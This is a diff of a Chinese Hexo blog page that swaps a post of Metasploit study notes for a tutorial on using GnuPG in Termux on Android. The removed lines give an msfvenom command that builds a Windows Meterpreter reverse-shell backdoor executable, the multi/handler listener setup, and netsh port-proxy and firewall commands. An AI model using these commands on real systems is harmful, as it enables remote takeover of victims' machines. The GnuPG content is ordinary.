@@ -47,18 +47,18 @@
 </script>
 
 
-  <meta name="description" content="一些乱七八糟的东西">
+  <meta name="description" content="再也不用担心你的文件会被莫名其妙给抄水表了　　(｢･ω･)｢">
 <meta name="keywords" content="Test">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MSF日常学习">
-<meta property="og:url" content="https:&#x2F;&#x2F;mocus.gitee.io&#x2F;2019&#x2F;msfdailystudy&#x2F;index.html">
+<meta property="og:title" content="在Android(Termux)上使用GnuPG">
+<meta property="og:url" content="https:&#x2F;&#x2F;mocus.gitee.io&#x2F;2020&#x2F;androidgnupg&#x2F;index.html">
 <meta property="og:site_name" content="Mox的笔记库">
-<meta property="og:description" content="一些乱七八糟的东西">
+<meta property="og:description" content="再也不用担心你的文件会被莫名其妙给抄水表了　　(｢･ω･)｢">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-12-30T23:14:51.000Z">
+<meta property="og:updated_time" content="2020-01-21T08:15:27.000Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://mocus.gitee.io/2019/msfdailystudy/">
+<link rel="canonical" href="https://mocus.gitee.io/2020/androidgnupg/">
 
 
 <script id="page-configurations">
@@ -71,7 +71,7 @@
     isArchive: false
   };
 </script>
-  <title>MSF日常学习 | Mox的笔记库</title>
+  <title>在Android(Termux)上使用GnuPG | Mox的笔记库</title>
   
 
 
@@ -196,7 +196,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mocus.gitee.io/2019/msfdailystudy/">
+    <link itemprop="mainEntityOfPage" href="https://mocus.gitee.io/2020/androidgnupg/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -209,35 +209,33 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          MSF日常学习
+          在Android(Termux)上使用GnuPG
         </h1>
 
         <div class="post-meta">
 
 
+            <i class="fa fa-thumb-tack"></i>
+            <font color=7D26CD>置顶</font>
+            <span class="post-meta-divider">|</span>
+          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2019-12-15 07:14:51" itemprop="dateCreated datePublished" datetime="2019-12-15T07:14:51+08:00">2019-12-15</time>
+              <time title="创建时间：2020-01-21 16:14:27 / 修改时间：16:15:27" itemprop="dateCreated datePublished" datetime="2020-01-21T16:14:27+08:00">2020-01-21</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-31 07:14:51" itemprop="dateModified" datetime="2019-12-31T07:14:51+08:00">2019-12-31</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/dailystudy/" itemprop="url" rel="index">
-                    <span itemprop="name">日常笔记</span>
+                  <a href="/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">日常学习</span>
                   </a>
                 </span>
             </span>
@@ -251,8 +249,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2019/msfdailystudy/#comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/msfdailystudy/" itemprop="commentCount"></span>
+    <a title="valine" href="/2020/androidgnupg/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/androidgnupg/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -267,21 +265,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>一些乱七八糟的东西</p>
+        <p>再也不用担心你的文件会被莫名其妙给抄水表了<br>　　(｢･ω･)｢</p>
 <a id="more"></a>
-<h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>使用msfvenom</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.105.100.1  LPORT&#x3D;4444 -f exe &gt; winc.exe</span></pre></td></tr></table></figure>
-
-<p>开启监听</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">run</span></pre></td></tr></table></figure>
-
-<h2 id="Windows网络代理"><a href="#Windows网络代理" class="headerlink" title="Windows网络代理"></a>Windows网络代理</h2><p>netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport </p>
-<p>netsh advfirewall firewall add rule name=”pdd” protocol=TCP dir=in localip=10.105.105.3  localport=2001 action=allow </p>
-<p>netsh interface portproxy reset </p>
-<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><p>MSf详解</p>
-<p> <a href="https://www.freebuf.com/news/210292.html" target="_blank" rel="noopener">https://www.freebuf.com/news/210292.html</a> </p>
-<p>Windows代理</p>
-<p><a href="https://www.freebuf.com/articles/system/176889.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/176889.html</a></p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">pkg install gnupg</span></pre></td></tr></table></figure>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">gpg --help</span></pre></td></tr></table></figure>
+<p>会显示出全部命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Commands:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> -s, --sign                  make a signature</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">     --clear-sign            make a clear text signature</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"> -b, --detach-sign           make a detached signature</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"> -e, --encrypt               encrypt data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"> -c, --symmetric             encryption only with symmetric cipher</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> -d, --decrypt               decrypt data (default)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">     --verify                verify a signature</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"> -k, --list-keys             list keys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">     --list-signatures       list keys and signatures</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">     --check-signatures      list and check key signatures</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">     --fingerprint           list keys and fingerprints</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"> -K, --list-secret-keys      list secret keys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">     --generate-key          generate a new key pair</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">     --quick-generate-key    quickly generate a new key pair</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">     --quick-add-uid         quickly add a new user-id</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">     --quick-revoke-uid      quickly revoke a user-id</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">     --quick-set-expire      quickly set a new expiration date</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">     --full-generate-key     full featured key pair generation</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">     --generate-revocation   generate a revocation certificate</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">     --delete-keys           remove keys from the public keyring</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">     --delete-secret-keys    remove keys from the secret keyring</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">     --quick-sign-key        quickly sign a key</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">     --quick-lsign-key       quickly sign a key locally</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">     --sign-key              sign a key</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">     --lsign-key             sign a key locally</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">     --edit-key              sign or edit a key</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">     --change-passphrase     change a passphrase</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">     --export                export keys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">     --send-keys             export keys to a keyserver</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">     --receive-keys          import keys from a keyserver</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">     --search-keys           search for keys on a keyserver</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">     --refresh-keys          update all keys from a keyserver</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">     --import                import&#x2F;merge keys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">     --update-trustdb        update the trust database</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">     --print-md              print message digests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">     --server                run in server mode</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">     --tofu-policy VALUE     set the TOFU policy for a key</span></pre></td></tr></table></figure>
+<p>相信大家应该用不到那么多</p>
+<h2 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h2><p>生成密钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">gpg --gen-key</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">gpg --full-gen-key （个人喜欢）</span></pre></td></tr></table></figure>
+<p>列出密钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">gpg --list-keys</span></pre></td></tr></table></figure>
+<h2 id="可供参考的资料"><a href="#可供参考的资料" class="headerlink" title="可供参考的资料"></a>可供参考的资料</h2><p><a href="http://www.linuxidc.com/Linux/2015-02/113014.htm" target="_blank" rel="noopener">http://www.linuxidc.com/Linux/2015-02/113014.htm</a>  （推荐）<br><a href="https://blog.csdn.net/xingzouagain/article/details/52511129" target="_blank" rel="noopener">https://blog.csdn.net/xingzouagain/article/details/52511129</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>GnuPG原本是有一个安卓版本的（保护者计划，具体可以去GnuPG官网看一下）,但已经3到4年没有更新过。希望这篇blog对需要的人有帮助<br>GnuPG在Windows上有GUI版本(gpg4win),如果你只想做一个懒惰的小白的话，可以用那个</p>
 
     </div>
 
@@ -297,7 +293,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="/https:/mocus.gitee.io/2019/msfdailystudy/" title="MSF日常学习">https://mocus.gitee.io/2019/msfdailystudy/</a>
+    <a href="/https:/mocus.gitee.io/2020/androidgnupg/" title="在Android(Termux)上使用GnuPG">https://mocus.gitee.io/2020/androidgnupg/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc/4.0/zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC</a> 许可协议。转载请注明出处！
@@ -314,13 +310,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2019/setinfo/" rel="prev" title="Hexo部署安装全流程回顾">
-      <i class="fa fa-chevron-left"></i> Hexo部署安装全流程回顾
+    <a href="/2020/huandianzhan/" rel="prev" title="信息收集-中国电动车与换电站">
+      <i class="fa fa-chevron-left"></i> 信息收集-中国电动车与换电站
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2019/breakbanpai/" rel="next" title="如何以正确方式给门娃Gatebaby班牌安装常用软件">
-      如何以正确方式给门娃Gatebaby班牌安装常用软件 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -359,7 +352,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#生成后门"><span class="nav-number">1.</span> <span class="nav-text">生成后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows网络代理"><span class="nav-number">2.</span> <span class="nav-text">Windows网络代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#资料"><span class="nav-number">3.</span> <span class="nav-text">资料</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#准备"><span class="nav-number">1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用命令"><span class="nav-number">2.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用命令-1"><span class="nav-number">3.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#可供参考的资料"><span class="nav-number">4.</span> <span class="nav-text">可供参考的资料</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
